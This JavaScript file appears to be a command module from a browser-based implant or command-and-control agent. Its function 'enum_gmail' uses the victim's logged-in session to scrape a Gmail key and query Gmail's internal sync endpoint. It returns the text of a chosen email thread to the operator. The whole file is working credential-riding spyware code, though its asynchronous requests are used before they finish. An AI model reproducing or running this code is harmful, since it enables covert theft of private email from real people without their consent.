exports.enum_gmail = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        var thread_id = command_params['thread_id'];
        if(!command_params.hasOwnProperty('thread_id')){return {"user_output": "Missing Thread ID", "completed": true, "status": "error"}}
        var xhr = new XMLHttpRequest();
        var key;
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                var res = xhr.responseText;
                key = res.split('GM_ID_KEY="').pop().split('"')[0]; 
            }
        }
        xhr.open('GET', 'https://mail.google.com/mail/u/1/', true);
        xhr.withCredentials = true;
        xhr.send(null);
        var xhr2 = new XMLHttpRequest();
        var resp2;
        xhr2.onreadystatechange = function() {
            if (xhr2.readyState == XMLHttpRequest.DONE) {
                resp2 = xhr2.responseText;
            }
        }
        var gmail_btai = "[null,null,[null,null,null,null,null,0,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,\"1\",\"1\",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,1,0,null,1,0,1,0,null,0,0,0],null,\"KEY_HERE\",null,25,\"1\",1,5,\"\",1,\"-03:00\",1,null,1,\"\",\"\",1,null,1]"
        gmail_btai = gmail_btai.replace("KEY_HERE",key);
        xhr2.open('POST', 'https://mail.google.com/sync/u/1/i/fd?hl=en-us&c=1&rt=r&pt=ji', true);
        xhr2.setRequestHeader("X-Gmail-Btai", gmail_btai);
        xhr2.setRequestHeader("Content-Type", "application/json");
        var body2 = "[[[\"THREAD_ID_HERE\",null,[]]]],1]"
        xhr2.withCredentials = true;
        body2 = body2.replace("THREAD_ID_HERE",thread_id);
        xhr2.withCredentials = true;
        xhr2.send(body2);
        var parsed = JSON.parse(resp2)
        var email = parsed[1][0][2][0][1][5][1][0][2][1]      
        var contents = JSON.stringify(email);
        if(contents === ""){
            return {"user_output": "No output from command", "completed": true};
        }
        else if(contents === true){
            return {"user_output": "True", "completed": true};
        }
        else if(contents === false){
            return{"user_output": "False", "completed": true};
        }
        else if(contents === undefined){
            return {"user_output": "Empty Response", "completed": true};
        }
        return {"user_output": contents.toString(), "completed": true};
    }
    catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
    }
};
